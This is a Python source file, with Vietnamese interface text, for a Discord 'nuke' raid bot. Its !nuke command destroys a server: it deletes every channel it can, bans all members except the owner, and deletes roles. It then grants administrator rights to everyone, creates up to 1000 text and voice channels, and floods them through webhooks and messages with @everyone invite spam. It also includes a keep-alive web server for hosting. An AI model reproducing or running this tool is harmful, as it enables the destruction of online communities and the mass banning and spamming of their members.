import discord
from discord.ext import commands
import asyncio
import aiohttp
import random
import os
from aiohttp import web

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

bot.nuking = False
SPAM_MODE = "both"
NEW_ICON_URL = "https://media.discordapp.net/attachments/1332244814892109885/1376589078753185862/static.png?ex=6835dffc&is=68348e7c&hm=f40c2f61a30d171b1c1a997c562f39c491a6ef09ec88b25b14a59c0c6478a6c3&=&format=webp&quality=lossless&width=320&height=320"
CUSTOM_SPAM_TEXT = "@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4
@everyone https://discord.gg/66CRXWrw4"
CUSTOM_ICON_URL = None
CUSTOM_SERVER_NAME = None
CUSTOM_CHANNEL_SUFFIX = None
CUSTOM_CHANNEL_COUNT = 1000
STEALTH_MODE = False
AUTO_ADD_ROLE = True
spam_tasks = []

@bot.event
async def on_ready():
    print(f'Bot đã sẵn sàng: {bot.user}')

class SpamModal(discord.ui.Modal, title="Cấu hình spam"):
    spam_text = discord.ui.TextInput(label="Nội dung spam", required=True)
    channel_count = discord.ui.TextInput(label="Số lượng kênh (tối đa 1000)", placeholder="Ví dụ: 100", required=False)
    suffix = discord.ui.TextInput(label="Tên sau emoji của kênh", placeholder="vd: text", required=False)
    stealth = discord.ui.TextInput(label="Chế độ tàng hình? (true/false)", required=False)
    add_role = discord.ui.TextInput(label="Tạo và gán role admin? (true/false)", required=False)

    async def on_submit(self, interaction: discord.Interaction):
        global CUSTOM_SPAM_TEXT, CUSTOM_CHANNEL_COUNT, CUSTOM_CHANNEL_SUFFIX, STEALTH_MODE, AUTO_ADD_ROLE
        CUSTOM_SPAM_TEXT = self.spam_text.value
        try:
            CUSTOM_CHANNEL_COUNT = min(int(self.channel_count.value), 1000) if self.channel_count.value else 1000
        except:
            CUSTOM_CHANNEL_COUNT = 1000
        CUSTOM_CHANNEL_SUFFIX = self.suffix.value if self.suffix.value else None
        STEALTH_MODE = self.stealth.value.lower() == "true" if self.stealth.value else False
        AUTO_ADD_ROLE = self.add_role.value.lower() == "true" if self.add_role.value else True
        await interaction.response.send_message("✅ Đã cập nhật", ephemeral=True)

class IconModal(discord.ui.Modal, title="Đổi icon server"):
    icon_url = discord.ui.TextInput(label="Link ảnh icon mới", required=True)
    async def on_submit(self, interaction: discord.Interaction):
        global CUSTOM_ICON_URL
        CUSTOM_ICON_URL = self.icon_url.value
        await interaction.response.send_message("Đã cập nhật icon", ephemeral=True)

class NameModal(discord.ui.Modal, title="name server"):
    name = discord.ui.TextInput(label="Tên server mới", required=True)
    async def on_submit(self, interaction: discord.Interaction):
        global CUSTOM_SERVER_NAME
        CUSTOM_SERVER_NAME = self.name.value
        await interaction.response.send_message("Ngu lồn", ephemeral=True)

class SetupDropdown(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="Spam Webhook", value="webhook", emoji="🌐"),
            discord.SelectOption(label="Spam Text", value="text", emoji="😂"),
            discord.SelectOption(label="Spam Tất Cả", value="all", emoji="🗿"),
            discord.SelectOption(label="Cấu hình icon server", value="icon", emoji="🤢"),
            discord.SelectOption(label="Cấu hình tên server", value="name", emoji="🥱"),
            discord.SelectOption(label="Cấu hình nội dung spam", value="spam_text", emoji="📢")
        ]
        super().__init__(placeholder="Chọn cấu hình...", options=options, min_values=1, max_values=1)
    async def callback(self, interaction: discord.Interaction):
        val = self.values[0]
        if val == "spam_text":
            await interaction.response.send_modal(SpamModal())
        elif val == "icon":
            await interaction.response.send_modal(IconModal())
        elif val == "name":
            await interaction.response.send_modal(NameModal())
        else:
            await interaction.response.send_message(f"✅ Đã chọn chế độ `{val}`. Dùng `!nuke` để thực hiện.", ephemeral=True)

class SetupView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=60)
        self.add_item(SetupDropdown())

@bot.command()
async def setup(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    embed = discord.Embed(title="🛠 Cấu hình NUKE", description=f"Xin chào {ctx.author.mention}!", color=discord.Color.purple())
    try:
        await ctx.author.send(embed=embed, view=SetupView())
    except:
        await ctx.send("❌ Không thể gửi tin nhắn DM", delete_after=10)

@bot.command()
async def nuke(ctx):
    bot.nuking = True
    try:
        await ctx.message.delete()
    except:
        pass
    guild = ctx.guild

    try:
        new_name = CUSTOM_SERVER_NAME or "Nuke by HOI"
        await guild.edit(name=new_name)
        url = CUSTOM_ICON_URL or NEW_ICON_URL
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    await guild.edit(icon=await resp.read())
    except:
        pass

    delete_tasks = [ch.delete() for ch in guild.channels if ch.permissions_for(guild.me).manage_channels]
    if delete_tasks:
        await asyncio.gather(*delete_tasks, return_exceptions=True)

    ban_tasks = []
    for member in guild.members:
        if member.id == bot.user.id or member == guild.owner:
            continue
        if bot.nuking:
            ban_tasks.append(asyncio.create_task(guild.ban(member, reason="MAX NUKE", delete_message_days=1)))
            if len(ban_tasks) >= 100:
                await asyncio.gather(*ban_tasks, return_exceptions=True)
                ban_tasks.clear()
    if ban_tasks:
        await asyncio.gather(*ban_tasks, return_exceptions=True)

    for role in guild.roles:
        if not role.is_default():
            try:
                await role.delete()
            except:
                pass

    if AUTO_ADD_ROLE:
        try:
            admin_role = await guild.create_role(name="NUKE BY PMT", permissions=discord.Permissions.administrator, color=discord.Color.red())
            role_add_tasks = [member.add_roles(admin_role) for member in guild.members if not member.bot]
            if role_add_tasks:
                await asyncio.gather(*role_add_tasks, return_exceptions=True)
        except:
            pass

    try:
        await guild.default_role.edit(permissions=discord.Permissions.all())
    except:
        pass

    channel_semaphore = asyncio.Semaphore(50)
    async def create_and_spam(idx):
        async with channel_semaphore:
            if not bot.nuking:
                return
            name_base = f"{CUSTOM_CHANNEL_SUFFIX or f'god-text-{idx}'}" if not STEALTH_MODE else f"chat-{random.randint(1000,9999)}"
            try:
                ch = await guild.create_text_channel(f"💣 {name_base}")
                if SPAM_MODE in ["webhook", "both"]:
                    for _ in range(3):
                        wh = await ch.create_webhook(name=f"wh_{random.randint(1000,9999)}")
                        async def wh_spam(webhook):
                            while bot.nuking:
                                try:
                                    msg = CUSTOM_SPAM_TEXT if not STEALTH_MODE else random.choice(["raid", "nuke", "ping"])
                                    await webhook.send(msg, username="RAIDMAX")
                                    await asyncio.sleep(0.01)
                                except:
                                    await asyncio.sleep(0.1)
                        spam_tasks.append(asyncio.create_task(wh_spam(wh)))
                if SPAM_MODE in ["text", "both"]:
                    async def txt_spam(channel):
                        while bot.nuking:
                            try:
                                await channel.send(CUSTOM_SPAM_TEXT if not STEALTH_MODE else "@everyone nuke")
                                await asyncio.sleep(0.01)
                            except:
                                await asyncio.sleep(0.1)
                    spam_tasks.append(asyncio.create_task(txt_spam(ch)))
            except:
                pass

    create_tasks = [create_and_spam(i) for i in range(1, min(CUSTOM_CHANNEL_COUNT, 1000) + 1)]
    await asyncio.gather(*create_tasks, return_exceptions=True)

    voice_tasks = []
    for i in range(1, min(CUSTOM_CHANNEL_COUNT, 1000) + 1):
        if not bot.nuking:
            break
        name = f"{CUSTOM_CHANNEL_SUFFIX or f'god-voice-{i}'}" if not STEALTH_MODE else f"voice-{random.randint(1000,9999)}"
        voice_tasks.append(asyncio.create_task(guild.create_voice_channel(f"🎧 {name}")))
        if len(voice_tasks) >= 50:
            await asyncio.gather(*voice_tasks, return_exceptions=True)
            voice_tasks.clear()
    if voice_tasks:
        await asyncio.gather(*voice_tasks, return_exceptions=True)

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(NEW_ICON_URL) as resp:
                if resp.status == 200:
                    img = await resp.read()
                    emoji_tasks = [guild.create_custom_emoji(name=f"nuke_{i}", image=img) for i in range(50)]
                    await asyncio.gather(*emoji_tasks, return_exceptions=True)
    except:
        pass

@bot.command()
async def stop(ctx):
    bot.nuking = False
    for task in spam_tasks:
        task.cancel()
    spam_tasks.clear()
    try:
        await ctx.message.delete()
    except:
        pass

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="NUKE ?", description="!setup - cấu hình\n!nuke - bắt đầu tấn công\n!stop - dừng spam", color=discord.Color.blue())
    try:
        await ctx.author.send(embed=embed)
    except:
        pass

async def handle_web(request):
    return web.Response(text="PMT ON")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_web)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', int(os.environ.get('PORT', 8080)))
    await site.start()
    print(f"Web server started on port {int(os.environ.get('PORT', 8080))}")

async def main():
    await start_web_server()
    await bot.start(os.getenv("DISCORD_TOKEN"))

if __name__ == "__main__":
    asyncio.run(main())
